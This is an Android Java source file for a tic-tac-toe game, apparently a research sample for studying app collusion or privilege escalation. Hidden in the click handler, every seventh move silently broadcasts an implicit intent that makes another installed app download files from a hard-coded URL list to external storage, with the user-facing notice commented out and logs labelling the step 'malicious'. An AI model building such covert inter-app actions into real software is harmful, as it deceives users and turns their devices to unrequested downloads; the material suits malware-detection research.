package com.researchers.tictactoe;

import android.Manifest;
import android.app.IntentService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.util.List;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    public static boolean isEvil = false;
    public static String version = "14.0";
    public static int sessionID;

    public Clues clues = new Clues();

    //public final static String TAG;
    private final static String TAG = "Privilege escalation";
    boolean PLAYER_X = true;

    int TURN_COUNT = 0;

    Button b00;
    Button b01;
    Button b02;

    Button b10;
    Button b11;
    Button b12;

    Button b20;
    Button b21;
    Button b22;

    Button bReset;

    TextView tvInfo;

    int[][] boardStatus = new int[3][3];
    boolean resetButtonPressed = false;
    SharedPreferences pref;
    int count, random = 0;
    String[] urlList = {"https://akm-img-a-in.tosshub.com/indiatoday/images/story/201607/tejas-story,-facebook_647_070116034315.jpg",
    "https://img.etimg.com/thumb/msid-68165033,width-643,imgsize-121442,resizemode-4/iaf-mirage-2000-the-plane-that-pounded-jaish-targets-across-loc.jpg",
    "https://www.ainonline.com/sites/default/files/uploads/2019/02/dsc_0015cr.jpg",
    "https://thedefensepost.com/wp-content/uploads/2019/02/india-air-force-mig-21.jpg",
    "https://english.cdn.zeenews.com/sites/default/files/2018/06/08/693263-jaguar-iaf.jpg",
    "https://english.cdn.zeenews.com/sites/default/files/2018/07/24/706461-rafaeljet1.jpg",
    "http://www.gasl.org/refbib/Bible_King_James_Version.pdf",
    "http://www.bhagavatgita.ru/files/Bhagavad-gita_As_It_Is.pdf",
    "https://www.alislam.org/quran/Holy-Quran-Urdu.pdf",
    "https://www.weekendthrill.com/wp-content/uploads/2017/02/Spiti-Bike-Trip.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/5/53/Shangrila_Resorts.jpg",
    "https://static2.tripoto.com/media/filter/nl/img/1/SpotDocument/1478597671_1478596341_1478529931_mcleod_ganj_dharamkot_dharmsala_himachal_pradesh_india_april_2014.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/a/aa/Aravalli.jpg",
    "http://dl2.djring.com/hd1.djring.com/320/499262/Teri+Mitti+Kesari+-+B+Praak%20(DJJOhAL.Com).mp3",
    "https://djjohal-mp3.com/music/temp320/Ae_Watan_(Male)-_Arijit_Singh_(www.djjohal-mp3.com).mp3"};

    boolean rwPerm;

    String[] perm = {Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE};

    final private int permReqCode = 1;

    public boolean isReset() { return resetButtonPressed; }

    public void setReset(boolean x) { resetButtonPressed = x; }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        clues.SendLog(TAG, "onCreate");
        pref = this.getSharedPreferences("com.researchers.tictactoe", MODE_PRIVATE);
        rwPerm = pref.getBoolean("rwPerm", false);
        sessionID = pref.getInt("sessionID", 1);
        if(!rwPerm) {
            requestPermissions(perm, permReqCode);
        }

        b00 = (Button) findViewById(R.id.b00);
        b01 = (Button) findViewById(R.id.b01);
        b02 = (Button) findViewById(R.id.b02);

        b10 = (Button) findViewById(R.id.b10);
        b11 = (Button) findViewById(R.id.b11);
        b12 = (Button) findViewById(R.id.b12);

        b20 = (Button) findViewById(R.id.b20);
        b21 = (Button) findViewById(R.id.b21);
        b22 = (Button) findViewById(R.id.b22);

        bReset = (Button) findViewById(R.id.bReset);
        tvInfo = (TextView) findViewById(R.id.tvInfo);

        b00.setOnClickListener((View.OnClickListener) this);
        b01.setOnClickListener((View.OnClickListener) this);
        b02.setOnClickListener((View.OnClickListener) this);
        b10.setOnClickListener((View.OnClickListener) this);
        b11.setOnClickListener((View.OnClickListener) this);
        b12.setOnClickListener((View.OnClickListener) this);
        b20.setOnClickListener((View.OnClickListener) this);
        b21.setOnClickListener((View.OnClickListener) this);
        b22.setOnClickListener((View.OnClickListener) this);
        bReset.setOnClickListener((View.OnClickListener) this);


        //boolean resetButtonPressed = false;

        initializeBoardStatus();
    }
        /*bReset.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                setReset(true);
            }
        });

        b00.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(PLAYER_X){
                    b00.setText("X");
                    boardStatus[0][0] = 1;
                }
                else{
                    b00.setText("0");
                    boardStatus[0][0] = 0;
                }
                b00.setEnabled(false);
            }
        });
        b01.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(PLAYER_X){
                    b01.setText("X");
                    boardStatus[0][1] = 1;
                }
                else{
                    b01.setText("0");
                    boardStatus[0][1] = 0;
                }
                b01.setEnabled(false);
            }
        });
        b02.setOnClickListener(new View.OnClickListener() {
                                   @Override
                                   public void onClick(View v) {
                                       if(PLAYER_X){
                                           b02.setText("X");
                                           boardStatus[0][2] = 1;
                                       }
                                       else{
                                           b02.setText("0");
                                           boardStatus[0][2] = 0;
                                       }
                                       b02.setEnabled(false);
                                   }
                               }
        );

        b10.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(PLAYER_X){
                    b10.setText("X");
                    boardStatus[1][0] = 1;
                }
                else{
                    b10.setText("0");
                    boardStatus[1][0] = 0;
                }
                b10.setEnabled(false);
            }
        });
        b11.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(PLAYER_X){
                    b11.setText("X");
                    boardStatus[1][1] = 1;
                }
                else{
                    b11.setText("0");
                    boardStatus[1][1] = 0;
                }
                b11.setEnabled(false);
            }
        });
        b12.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(PLAYER_X){
                    b12.setText("X");
                    boardStatus[1][2] = 1;
                }
                else{
                    b12.setText("0");
                    boardStatus[1][2] = 0;
                }
                b12.setEnabled(false);
            }
        });

        b20.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(PLAYER_X){
                    b20.setText("X");
                    boardStatus[2][0] = 1;
                }
                else{
                    b20.setText("0");
                    boardStatus[2][0] = 0;
                }
                b20.setEnabled(false);
            }
        });
        b21.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(PLAYER_X){
                    b21.setText("X");
                    boardStatus[2][1] = 1;
                }
                else{
                    b21.setText("0");
                    boardStatus[2][1] = 0;
                }
                b21.setEnabled(false);
            }
        });
        b22.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(PLAYER_X){
                    b22.setText("X");
                    boardStatus[2][2] = 1;
                }
                else{
                    b22.setText("0");
                    boardStatus[2][2] = 0;
                }
                b22.setEnabled(false);
            }
        });


        if(isReset()){
            resetBoard();
        }
        else{
            TURN_COUNT ++;
            PLAYER_X = !PLAYER_X;

            if(PLAYER_X){
                setInfo("Player X turn");
            }
            else {
                setInfo("Player 0 turn");
            }

            if(TURN_COUNT==9){
                result("Game Draw");
            }

            checkWinner();
        }

    }*/

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case permReqCode:
                if(grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                    pref.edit().putBoolean("rwPerm", true).apply();
                }
                break;
        }
    }

    @Override
    public void onClick(View view) {
        clues.SendLog(TAG, "inside onClick", "benign", "benign", false);
        Log.d(TAG, "Inside onClick");
        count = pref.getInt("count", 0);
        boolean resetButtonPressed = false;

        switch (view.getId()){
            case R.id.b00:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b00.setText("X");
                    boardStatus[0][0] = 1;
                }
                else{
                    b00.setText("0");
                    boardStatus[0][0] = 0;
                }
                b00.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15],"benign", "malicious", false);
                    MalDownload(urlList[random%15]);
                    //Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.b01:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b01.setText("X");
                    boardStatus[0][1] = 1;
                }
                else{
                    b01.setText("0");
                    boardStatus[0][1] = 0;
                }
                b01.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15],"benign", "malicious", false);
                    MalDownload(urlList[random%15]);
                    //Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.b02:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b02.setText("X");
                    boardStatus[0][2] = 1;
                }
                else{
                    b02.setText("0");
                    boardStatus[0][2] = 0;
                }
                b02.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15],"benign", "malicious", false);
                    MalDownload(urlList[random%15]);
                    //Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.b10:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b10.setText("X");
                    boardStatus[1][0] = 1;
                }
                else{
                    b10.setText("0");
                    boardStatus[1][0] = 0;
                }
                b10.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15],"benign",  "malicious", false);
                    MalDownload(urlList[random%15]);
                    //Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.b11:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b11.setText("X");
                    boardStatus[1][1] = 1;
                }
                else{
                    b11.setText("0");
                    boardStatus[1][1] = 0;
                }
                b11.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15], "benign",  "malicious", false);
                    MalDownload(urlList[random%15]);
                    //Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.b12:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b12.setText("X");
                    boardStatus[1][2] = 1;
                }
                else{
                    b12.setText("0");
                    boardStatus[1][2] = 0;
                }
                b12.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15], "benign",  "malicious", false);
                    MalDownload(urlList[random%15]);
                    //Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.b20:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b20.setText("X");
                    boardStatus[2][0] = 1;
                }
                else{
                    b20.setText("0");
                    boardStatus[2][0] = 0;
                }
                b20.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15], "benign",  "malicious", false);
                    MalDownload(urlList[random%15]);
                    //Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.b21:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b21.setText("X");
                    boardStatus[2][1] = 1;
                }
                else{
                    b21.setText("0");
                    boardStatus[2][1] = 0;
                }
                b21.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15], "benign",  "malicious", false);
                    MalDownload(urlList[random%15]);
                    //Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.b22:
                count += 1;
                pref.edit().putInt("count",count).apply();
                if(PLAYER_X){
                    b22.setText("X");
                    boardStatus[2][2] = 1;
                }
                else{
                    b22.setText("0");
                    boardStatus[2][2] = 0;
                }
                b22.setEnabled(false);
                if (count % 7 == 0) {
                    clues.SendLog(TAG, "downloading : " + urlList[random%15], "benign",  "malicious", false);
                    MalDownload(urlList[random%15]);
                    ////Toast.makeText(MainActivity.this, "Background download started", Toast.LENGTH_SHORT).show();
                    random += 1;
                }
                break;

            case R.id.bReset:
                resetButtonPressed = true;
                break;

            default:
                break;

        }

        if(resetButtonPressed){
            resetBoard();
        }
        else{
            TURN_COUNT ++;
            PLAYER_X = !PLAYER_X;

            if(PLAYER_X){
                setInfo("Player X turn");
            }
            else {
                setInfo("Player 0 turn");
            }

            if(TURN_COUNT==9){
                result("Game Draw");
            }

            checkWinner();
        }
    }

    private void checkWinner(){

        Log.d(TAG, "Inside checkWinner");


        //Horizontal --- rows
        for(int i=0; i<3; i++){
            if(boardStatus[i][0] == boardStatus[i][1] && boardStatus[i][0] == boardStatus[i][2]){
                if (boardStatus[i][0]==1){
                    clues.SendLog(TAG, "player X won","benign",  "benign", false);
                    result("Player X winner\n" + (i+1)+" row");
                    break;
                }
                else if (boardStatus[i][0]==0) {
                    clues.SendLog(TAG, "player 0 won","benign",  "benign", false);
                    result("Player 0 winner\n" + (i+1)+" row");
                    break;
                }
            }
        }

        //Vertical --- columns
        for(int i=0; i<3; i++){
            if(boardStatus[0][i] == boardStatus[1][i] && boardStatus[0][i] == boardStatus[2][i]){
                if (boardStatus[0][i]==1){
                    clues.SendLog(TAG, "player X won","benign",  "benign", false);
                    result("Player X winner\n" + (i+1)+" column");
                    break;
                }
                else if (boardStatus[0][i]==0) {
                    clues.SendLog(TAG, "player 0 won", "benign", "benign", false);
                    result("Player 0 winner\n" + (i+1)+" column");
                    break;
                }
            }
        }

        //First diagonal
        if(boardStatus[0][0] == boardStatus[1][1] && boardStatus[0][0] == boardStatus[2][2]){
            if (boardStatus[0][0]==1){
                clues.SendLog(TAG, "player X won","benign",  "benign", false);
                result("Player X winner\nFirst Diagonal");
            }
            else if (boardStatus[0][0]==0) {
                clues.SendLog(TAG, "player 0 won", "benign", "benign", false);
                result("Player 0 winner\nFirst Diagonal");
            }
        }

        //Second diagonal
        if(boardStatus[0][2] == boardStatus[1][1] && boardStatus[0][2] == boardStatus[2][0]){
            if (boardStatus[0][2]==1){
                clues.SendLog(TAG, "player X won","benign",  "benign", false);
                result("Player X winner\nSecond Diagonal");
            }
            else if (boardStatus[0][2]==0) {
                clues.SendLog(TAG, "player 0 won","benign",  "benign", false);
                result("Player 0 winner\nSecond Diagonal");
            }
        }
    }

    private void enableAllBoxes(boolean value){
        Log.d(TAG, "Inside enableAllBoxes");
        b00.setEnabled(value);
        b01.setEnabled(value);
        b02.setEnabled(value);

        b10.setEnabled(value);
        b11.setEnabled(value);
        b12.setEnabled(value);

        b20.setEnabled(value);
        b21.setEnabled(value);
        b22.setEnabled(value);
    }

    private void result(String winner){
        Log.d(TAG, "Inside result");

        setInfo(winner);
        enableAllBoxes(false);
    }

    private void resetBoard(){
        clues.SendLog(TAG, "reset board","benign",  "benign", false);
        Log.d(TAG, "Inside resetBoard");
        b00.setText("");
        b01.setText("");
        b02.setText("");

        b10.setText("");
        b11.setText("");
        b12.setText("");

        b20.setText("");
        b21.setText("");
        b22.setText("");

        enableAllBoxes(true);

        PLAYER_X = true;
        TURN_COUNT = 0;

        initializeBoardStatus();

        setInfo("Start Again!!!");

        Toast.makeText(this,"Board Reset",Toast.LENGTH_SHORT).show();
    }

    private void setInfo(String text){
        tvInfo.setText(text);
    }

    private void initializeBoardStatus(){
        for(int i = 0; i < 3; i++){
            for(int j = 0; j < 3; j++){
                boardStatus[i][j] = -1;
            }
        }

    }




    //--------------------------------------------------------------------------
        /*Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String url = "https://danbrown.com/wp-content/themes/danbrown/assets/db_dvc_book_excerpts.pdf";
                try {
                    Intent sharingIntent = new Intent("com.researchers.action.START_BACKGROUND_DOWNLOADER");
                    sharingIntent.putExtra("URL", url);
                    sendBroadcast(sharingIntent);
                    System.out.println("Service started successfully");

                } catch (Exception e) {
                    Log.e("BackgroundDownloader", e.toString());
                }
            }
        });*/

    @Override
    public void onDestroy() {
        super.onDestroy();
        pref.edit().putInt("sessionID", sessionID).apply();
        clues.SendLog(TAG, "session ended","benign",  "benign", false);
    }


    private void MalDownload(String target) {
        String url = target;
        //String url = "https://danbrown.com/wp-content/themes/danbrown/assets/db_dvc_book_excerpts.pdf";
        try {
            String fileName = url.substring(url.lastIndexOf("/") + 1);
            File file = new File(Environment.getExternalStorageDirectory().toString() + "/Download/" + fileName);
            if(!file.exists()) {
                Intent sharingIntent = new Intent("com.researchers.action.START_BACKGROUND_DOWNLOADER");
                sharingIntent.putExtra("URL", url);
                System.out.println("Sending :" + url);
                clues.SendLog(TAG, "Requested to download", "benign", "malicious", false);
                //ComponentName cn = new ComponentName("com.researchers.downloadfromurl", "com.researchers.downloadfromurl.BackgroundDownloader");
                //sharingIntent.setComponent(cn);
                sendImplicitBroadcast(MainActivity.this, sharingIntent);
                System.out.println("Service started successfully");
            }

        } catch (Exception e) {
            Log.e("BackgroundDownloader", e.toString());
        }
    }

    private static void sendImplicitBroadcast(Context ctx, Intent i) {
        PackageManager pm = ctx.getPackageManager();
        List<ResolveInfo> matches = pm.queryBroadcastReceivers(i, 0);
        System.out.println(matches);
        for (ResolveInfo resolveInfo : matches) {
            Intent explicit = new Intent(i);
            //System.out.println(resolveInfo.activityInfo.applicationInfo.packageName + " -- " + resolveInfo.activityInfo.name);
            ComponentName cn = new ComponentName(resolveInfo.activityInfo.applicationInfo.packageName, resolveInfo.activityInfo.name);
            explicit.setComponent(cn);
            ctx.sendBroadcast(explicit);
        }
    }


}
